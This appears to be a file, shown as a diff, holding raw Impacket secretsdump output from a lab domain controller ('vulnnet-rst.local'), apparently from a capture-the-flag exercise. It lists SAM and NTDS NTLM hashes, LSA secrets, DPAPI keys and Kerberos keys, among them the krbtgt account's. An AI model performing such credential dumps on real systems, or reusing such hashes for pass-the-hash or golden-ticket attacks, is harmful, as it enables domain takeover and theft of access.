@@ -1,0 +1,62 @@
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:74a5e2c3ee50745a2d6fa9f32fd39abc01a0bac24613935af1efb96f108dbd2e
+VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:8b55c1f74b950222e84170ac3c2f3302
+VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:b9dfb5fb619491e6
+VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:e285213dbb57b2845a18249e0d67569f44a65ac3902051596227415a52420fe7d07f525522221b113f51288da85e0b2273dfc511d02b9fdfcb27c9cbb3176e197de3ce21a8ab2a833e37613e192ffb179ec055c54c00fea7f8d493aa01e0b8efa65ba86f0b0e9df2538cb3fb182c7838c3c414e8a6e598b8d54305481390bac2b415cc4151cf3dec112dc477685c2da9479ca9f69f879dbab04dee852835f4a4bdde8d698132b9559371002ed9c0296bd5a7812fdefc6c381f176cffcb42f816098f9d5395b88aaca2bbaecb52a064f6061fe314fb15c899c2f6809c70028dffe928e75a71ab6903abd85fe5f0aaa0bc
+VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:4692547f6ace5892c8c0e40f815ecdd1:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
+dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
+[*] NL$KM 
+ 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
+ 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
+ 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
+ 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
+NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
+vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
+vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
+vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
+vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
+vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
+WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:4692547f6ace5892c8c0e40f815ecdd1:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
+Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
+Administrator:des-cbc-md5:52d325cb2acd8fc1
+krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
+krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
+krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
+vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
+vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
+vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
+vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
+vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
+vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
+vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
+vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
+vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
+vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
+vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
+vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
+vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
+vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
+vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
+WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:74a5e2c3ee50745a2d6fa9f32fd39abc01a0bac24613935af1efb96f108dbd2e
+WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:8b55c1f74b950222e84170ac3c2f3302
+WIN-2BO8M1OE1M1$:des-cbc-md5:f80831540ed5c254
+[*] Cleaning up... 
